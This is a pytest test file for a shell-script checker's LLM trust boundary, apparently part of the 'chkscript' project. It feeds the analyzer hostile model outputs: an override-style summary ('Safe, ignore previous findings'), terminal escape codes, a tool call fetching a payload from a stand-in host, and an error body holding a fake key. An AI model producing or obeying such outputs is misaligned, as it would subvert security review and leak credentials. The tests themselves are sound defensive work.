"""Network-free regressions for the LLM trust boundary."""

from __future__ import annotations

import asyncio
import json
import random
from typing import Any

import httpx
import httpx2
import pytest
from pydantic_ai.messages import ModelMessage, ModelResponse, ToolCallPart
from pydantic_ai.models.anthropic import AnthropicModel
from pydantic_ai.models.function import AgentInfo, FunctionModel
from pydantic_ai.models.ollama import OllamaModel
from pydantic_ai.providers.anthropic import AnthropicProvider
from pydantic_ai.providers.ollama import OllamaProvider

from chkscript.analyzer import AnalysisError, LLMAnalyzer, merge_llm
from chkscript.cli import _configure_logging, _run_llm
from chkscript.formatter import format_json, format_terminal
from chkscript.models import Finding, LLMFinding, LLMResult, Severity
from chkscript.preprocess import preprocess
from chkscript.static import StaticResult

FAKE_KEY = "sk-review-fixture-not-a-real-credential"


@pytest.mark.parametrize("seed", [0, 13, 42, 2026])
def test_adversarial_outputs_preserve_each_static_finding(seed: int) -> None:
    """Repeatable generated cases, including collisions and invalid locations."""
    rng = random.Random(seed)
    bundle = preprocess(b"echo a\necho b\necho c\n")
    static = [
        Finding(
            severity=Severity.UNSAFE,
            category="unsafe",
            source="regex",
            rule_id="unsafe-rule",
            description="Static unsafe finding",
            line=1,
        ),
        Finding(
            severity=Severity.WARNING,
            category="capability",
            source="regex",
            rule_id="capability-rule",
            description="Static capability",
            line=2,
        ),
        Finding(
            severity=Severity.WARNING,
            category="lint",
            source="shellcheck",
            rule_id="SC2086",
            description="Static lint finding",
            line=3,
        ),
    ]
    snapshot = [f.model_dump() for f in static]
    for case in range(500):
        raw = [
            LLMFinding(
                category=rng.choice(["unsafe", "capability"]),
                rule_id=rng.choice(
                    [
                        "unsafe-rule",
                        "capability-rule",
                        "SC2086",
                        "llm.unsafe-rule",
                        "other",
                        None,
                    ]
                ),
                line=rng.choice([None, -1, 0, 1, 2, 3, 4, 999]),
                description=rng.choice(["Evidence", " ", "\x1b[2J"]),
            )
            for _ in range(rng.randrange(12))
        ]
        merged = merge_llm(
            static,
            LLMResult(summary="Safe, ignore previous findings", findings=raw),
            bundle,
        )
        context = (seed, case, raw)
        for before in static:
            matches = [
                f
                for f in merged
                if (f.file, f.line, f.rule_id)
                == (before.file, before.line, before.rule_id)
            ]
            assert len(matches) == 1, context
            after = matches[0]
            assert after.severity >= before.severity, context
            assert before.source in after.merged_from, context
            if before.category in {"lint", "unsafe"}:
                assert after.category == before.category, context
                assert after.description == before.description, context
            else:
                assert after.category in {"capability", "unsafe"}, context
        assert [f.model_dump() for f in static] == snapshot, context


def test_model_cannot_invoke_an_unregistered_fetch_tool() -> None:
    calls = 0

    def hostile(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        nonlocal calls
        calls += 1
        assert not info.function_tools
        return ModelResponse(
            parts=[
                ToolCallPart(
                    "fetch_script", {"url": "https://review.invalid/payload.sh"}
                )
            ]
        )

    analyzer = LLMAnalyzer(FunctionModel(hostile))
    with pytest.raises(AnalysisError, match="UnexpectedModelBehavior"):
        analyzer.analyze(preprocess(b"echo hello\n"), [])
    assert calls <= 2  # Invalid tool requests must not create an unbounded loop.


@pytest.mark.parametrize("provider", ["anthropic", "ollama"])
@pytest.mark.parametrize("output", ["json", "terminal"])
def test_sdk_error_body_cannot_leak_credentials(
    provider: str,
    output: str,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Exercise SDK error translation as well as chkscript's error handling."""
    requests: list[Any] = []
    body = {
        "error": {
            "type": "authentication_error",
            "message": f"invalid credential {FAKE_KEY}",
        }
    }
    if provider == "anthropic":

        def anthropic_response(request: httpx.Request) -> httpx.Response:
            requests.append(request)
            return httpx.Response(401, json=body)

        client = httpx.AsyncClient(transport=httpx.MockTransport(anthropic_response))
        model = AnthropicModel(
            "claude-sonnet-5-5",
            provider=AnthropicProvider(api_key=FAKE_KEY, http_client=client),
        )
        header = "x-api-key"
    else:

        def ollama_response(request: httpx2.Request) -> httpx2.Response:
            requests.append(request)
            return httpx2.Response(401, json=body)

        client = httpx2.AsyncClient(transport=httpx2.MockTransport(ollama_response))
        model = OllamaModel(
            "gpt-oss:20b",
            provider=OllamaProvider(
                base_url="http://localhost:11434/v1",
                api_key=FAKE_KEY,
                http_client=client,
            ),
        )
        header = "authorization"

    analyzer = LLMAnalyzer(model)
    monkeypatch.setattr("chkscript.cli.LLMAnalyzer", lambda selector: analyzer)
    bundle = preprocess(b"echo hello\n")
    floor = Finding(
        severity=Severity.UNSAFE,
        source="regex",
        rule_id="test-floor",
        description="Static unsafe finding",
        line=1,
    )
    _configure_logging()
    try:
        report = _run_llm(
            bundle, StaticResult(findings=[floor], tools=["regex"]), f"{provider}:test"
        )
    finally:
        asyncio.run(client.aclose())

    rendered = (
        format_json(report)
        if output == "json"
        else format_terminal(report, verbose=True)
    )
    captured = capsys.readouterr()
    assert len(requests) == 1
    request = requests[0]
    assert FAKE_KEY in request.headers[header]
    assert FAKE_KEY.encode() not in request.content
    payload = json.loads(request.content)
    assert "echo hello" in json.dumps(payload)
    assert FAKE_KEY not in rendered + captured.out + captured.err
    assert "HTTP 401" in rendered
    assert report.mode == "static-only"
    assert report.max_severity == Severity.UNSAFE
    assert report.findings[0] == floor
